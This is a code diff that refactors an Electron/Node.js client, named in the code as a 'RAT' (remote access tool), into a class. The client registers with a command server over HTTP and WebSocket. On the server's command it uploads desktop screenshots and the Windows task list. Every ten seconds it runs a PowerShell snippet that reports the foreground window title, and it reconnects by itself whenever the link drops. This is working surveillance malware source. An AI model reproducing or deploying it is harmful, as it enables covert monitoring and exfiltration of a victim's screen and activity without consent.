@@ -2,72 +2,118 @@ const { app, BrowserWindow } = require('electron');
 const axios = require('axios');
 const WebSocket = require('ws');
 const os = require('os');
+const { execSync } = require('child_process');
 const screenshot = require('desktop-screenshot');
 const FormData = require('form-data');
 const fs = require('fs');
-const exec = require('child_process').exec;
 
 
-const SERVER_URL = '127.0.0.1:8000';
+class RAT {
+  constructor(server_url, show_window=false) {
+    this.server_url = server_url;
 
-let CURRENT_ID = null;
-let PC_NAME = null;
-let connect_time = null;
-let CURRENT_IP = null;
+    this.window = null;
+    this.user_id = null;
+    this.pc_name = null;
+    this.connect_time = null;
+    this.ip_address = null;
+    this.ws = null;
 
-const createWindow = () => {
-  const window = new BrowserWindow({
-    width: 800,
-    height: 600,
-  });
-};
+    this.commands = {
+      'send_tasklist': () => this.sendTasklistRequest(),
+      'send_screenshot': () => this.sendScreenshotRequest(),
+      'send_ping': () => this.sendPingRequest(),
+    }
 
-function setCurrentID(connect_websocket) {
-  axios({
-    method: 'get',
-    url: `http://${SERVER_URL}/get_id/`,
-    data: {
-      'pc_name': os.hostname(),
-    },
-  }).then((response) => {
-    CURRENT_ID = response.data.id;
-    PC_NAME = response.data.pc_name;
-    connect_time = response.data.connect_time;
-    CURRENT_IP = response.data.ip;
-    connect_websocket();
-  }).catch((err) => {
-    setTimeout(() => {setCurrentID(connect_websocket)}, 10000);
-  });
-};
+    if (show_window) this.createWindow();
 
-function connectWebSocket() {
-  const ws = new WebSocket(
-    'ws://'
-    + SERVER_URL
-    + '/ws/list/'
-  );
+    this.setCurrentID();
+  }
 
-  ws.onmessage = function (e) {
-    parseResponse(ws, e.data);
-  };
+  onWebSocketMessage(message) {
+    const data = JSON.parse(message);
 
-  ws.onclose = function (e) {
-    throw ('WebSocket closed unexeceptly.');
-  };
+    if (!(data.command in this.commands)) return;
+    if (data.id !== this.user_id) return;
 
-  ws.addEventListener('open', function () {
-    sendConnectRequest(ws);
+    this.commands[data.command](data);
+  }
 
-    setInterval(() => {grabCurrentActiveWindow(ws)}, 10000);
+  onWebSocketConnected() {
+    this.sendConnectRequest();
+    this.addOnQuitEvent();
+    this.startWindowGrabber();
+  }
 
-    app.on('will-quit', () => {
-      sendDisconnectRequest(ws);
+  sendScreenshotRequest() {
+    screenshot("screenshot.png", (error, complete) => {
+      if(error)
+          console.log("Screenshot failed", error);
+      else {
+        let fdata = new FormData();
+        fdata.append('file', fs.createReadStream('screenshot.png'));
+
+        axios.post(`http://${this.server_url}/save_picture/`, fdata, {
+          headers: {
+            'accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.8',
+            'Content-Type': `multipart/form-data; boundary=${fdata._boundary}`,
+          }
+        }).then((response) => {
+          const result = {
+            id: this.user_id,
+            command: 'screenshot_sended',
+            screenshot_url: response.data.sc_url,
+          };
+          this.ws.send(JSON.stringify(result));
+        });
+      };
     });
-  });
-};
+  }
 
-function grabCurrentActiveWindow(ws) {
-  let command = `
+  sendTasklistRequest() {
+    const response = {
+      id: this.user_id,
+      command: 'tasklist_sended',
+      tasks: execSync('tasklist').toString().trim(),
+    };
+    this.ws.send(JSON.stringify(response));
+  }
+
+  sendPingRequest() {
+    const response = {
+      id: this.user_id,
+      command: 'ping_sended',
+    };
+    this.ws.send(JSON.stringify(response));
+  }
+
+  addOnQuitEvent() {
+    app.on('will-quit', () => {
+      const request = {
+        id: this.user_id,
+        command: 'disconnect',
+      };
+
+      this.ws.send(JSON.stringify(request));
+    });
+  }
+
+  sendConnectRequest() {
+    const request = {
+      id: this.user_id,
+      command: 'connect',
+      pc_name: this.pc_name,
+      connect_time: this.connect_time,
+      ip: this.ip_address,
+    };
+
+    this.ws.send(JSON.stringify(request));
+  };
+
+  // Start sending current foreground window every 10 seconds
+  startWindowGrabber() {
+    let command = `
 Add-Type  @"
 using System;
 using System.Runtime.InteropServices;
@@ -92,98 +138,78 @@ $len = [apifuncs]::GetWindowTextLength($w)
 $sb = New-Object text.stringbuilder -ArgumentList ($len + 1)
 $rtnlen = [apifuncs]::GetWindowText($w,$sb,$sb.Capacity)
 write-host "$($sb.tostring())"
-  `;
-  exec(command, {'shell': 'powershell'}, (err, stdout, stderr) => {
+    `;
+
     const response = {
-      id: CURRENT_ID,
+      id: this.user_id,
       command: 'activity_sended',
-      activity: stdout
+      activity: execSync(command, {'shell': 'powershell'}).toString().trim(),
     };
-    ws.send(JSON.stringify(response));
-  });
-};
+    this.ws.send(JSON.stringify(response));
 
-function sendConnectRequest(ws) {
-  const request = {
-    id: CURRENT_ID,
-    command: 'connect',
-    pc_name: PC_NAME,
-    connect_time: connect_time,
-    ip: CURRENT_IP,
-  };
-
-  ws.send(JSON.stringify(request));
-};
-
-function sendDisconnectRequest(ws) {
-  const request = {
-    id: CURRENT_ID,
-    command: 'disconnect',
-  };
-
-  ws.send(JSON.stringify(request));
-};
-
-const commands = {
-  'send_tasklist': (ws, data) => sendTasklistRequest(ws, data),
-  'send_screenshot': (ws, data) => sendScreenshotRequest(ws, data),
-  'send_ping': (ws, data) => sendPingRequest(ws, data),
-};
-
-function parseResponse(ws, response) {
-  const data = JSON.parse(response);
-  if (data.id === CURRENT_ID & data.command in commands) {
-    commands[data.command](ws, data);
+    setTimeout(() => {
+      this.startWindowGrabber();
+    }, 10000);
   }
-};
 
-function sendPingRequest(ws, data) {
-  const response = {
-    id: CURRENT_ID,
-    command: 'ping_sended',
-  };
-  ws.send(JSON.stringify(response));
-};
+  connectWebSocket() {
+    this.ws = new WebSocket(
+      'ws://' + this.server_url + '/ws/list/',
+    );
 
-function sendTasklistRequest(ws, data) {
-  exec('tasklist', (err, stdout, stderr) => {
-    const response = {
-      id: CURRENT_ID,
-      command: 'tasklist_sended',
-      tasks: stdout
+    this.ws.onmessage = (event) => {
+      this.onWebSocketMessage(event.data);
     };
-    ws.send(JSON.stringify(response));
-  });
-};
 
-function sendScreenshotRequest(ws, data) {
-  screenshot("screenshot.png", function(error, complete) {
-    if(error)
-        console.log("Screenshot failed", error);
-    else {
-      let fdata = new FormData();
-      fdata.append('file', fs.createReadStream('screenshot.png'));
+    this.ws.addEventListener('open', () => {
+      console.log('Connected to websocket');
+      this.onWebSocketConnected();
+    });
 
-      axios.post(`http://${SERVER_URL}/save_picture/`, fdata, {
-        headers: {
-          'accept': 'application/json',
-          'Accept-Language': 'en-US,en;q=0.8',
-          'Content-Type': `multipart/form-data; boundary=${fdata._boundary}`,
-        }
-      }).then(function (response) {
-        console.log(response.data.sc_url);
-        const result = {
-          id: CURRENT_ID,
-          command: 'screenshot_sended',
-          screenshot_url: response.data.sc_url,
-        };
-        ws.send(JSON.stringify(result));
-      });
-    };
-  });
-};
+    // Reconnect websocket on close
+    this.ws.addEventListener('close', () => {
+      console.log('Disconnected from websocket');
+      this.setCurrentID();
+    });
+  }
 
+  // Create window for easy close application if flag is true
+  createWindow() {
+    this.window = new BrowserWindow({
+      width: 800,
+      height: 600,
+    });
+  }
+
+  // Getting ID of user from server, and trying to connect websocket
+  setCurrentID(timeout=null) {
+    axios({
+      method: 'get',
+      url: `http://${this.server_url}/get_id/`,
+      data: {
+        'pc_name': os.hostname(),
+      },
+    })
+    .then((response) => {
+      console.log('ID from server: ' + response.data.id);
+      this.user_id = response.data.id;
+      this.pc_name = response.data.pc_name;
+      this.connect_time = response.data.connect_time;
+      this.ip_address = response.data.ip;
+      this.connectWebSocket();
+    }).catch(() => {
+      console.log('Trying to get ID from server...');
+      if (timeout) clearTimeout(timeout);
+      timeout = setTimeout(() => {this.setCurrentID()}, 10000);
+    });
+  }
+}
+
+
+// Start the app
 app.whenReady().then(() => {
-  createWindow();
-  setCurrentID(connectWebSocket);
+  let rat = new RAT(
+    server_url='127.0.0.1:8000',
+    show_window=true,
+  );
 });
